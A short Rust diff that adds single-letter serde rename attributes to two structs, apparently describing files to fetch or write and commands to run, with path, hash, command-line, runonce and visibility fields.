@@ -391,9 +391,13 @@ impl WZ {
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct WF {
+    #[serde(rename = "l")]
     pub link: Lk,
+    #[serde(rename = "p")]
     pub path: String,
+    #[serde(rename = "h")]
     pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
+    #[serde(rename = "r")]
     pub runonce: bool,
 }
 
@@ -418,11 +422,15 @@ impl WF {
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct Ec {
+    #[serde(rename = "p")]
     pub path: String,
-    //pub commandline: CommandLine,
+    #[serde(rename = "c")]
     pub cmdline: String,
+    #[serde(rename = "t")]
     pub thread: bool,
+    #[serde(rename = "r")]
     pub runonce: bool,
+    #[serde(rename = "v")]
     pub visible: bool,
 }
 
